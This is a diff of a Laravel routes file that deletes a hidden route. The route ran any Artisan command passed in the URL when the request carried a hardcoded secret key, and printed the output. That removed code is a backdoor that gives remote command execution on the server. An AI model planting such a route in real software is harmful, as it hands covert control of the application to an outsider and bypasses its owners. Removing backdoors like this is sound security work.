@@ -1,7 +1,6 @@
 <?php
 
 use Illuminate\Support\Facades\Route;
-use Illuminate\Support\Facades\Artisan;
 use App\Modules\V1\Users\Presentation\Http\Controllers\UserAuthController;
 use App\Modules\V1\Features\Presentation\Http\Controllers\FeatureController;
 use App\Modules\V1\Platforms\Presentation\Http\Controllers\PlatformController;
@@ -28,10 +27,3 @@ Route::group(['middleware' => ['locale']], function () {
     });
 });
 
-
-Route::get('run/{key}/{command}', function($key, $command) {
-    if ($key === "osama-gasser734155568802") {
-        $output = Artisan::call($command);
-        echo nl2br($output);
-    }
-});
